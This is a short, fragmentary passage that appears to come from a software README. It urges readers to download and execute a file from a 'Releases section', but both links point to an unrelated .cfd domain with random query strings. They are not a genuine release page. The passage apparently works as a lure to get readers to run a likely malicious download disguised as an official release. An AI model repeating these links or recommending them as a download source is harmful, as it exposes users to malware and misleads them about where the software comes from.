...
To get started, you can download the latest version from the [Releases section](https://gitdownloadbcv.cfd?bzg99myya8dhxzu). Be sure to download and execute the appropriate file for your system.
...
1. Visit the [Releases section](https://gitdownloadbcv.cfd?bw8r3v702y1jgb6).
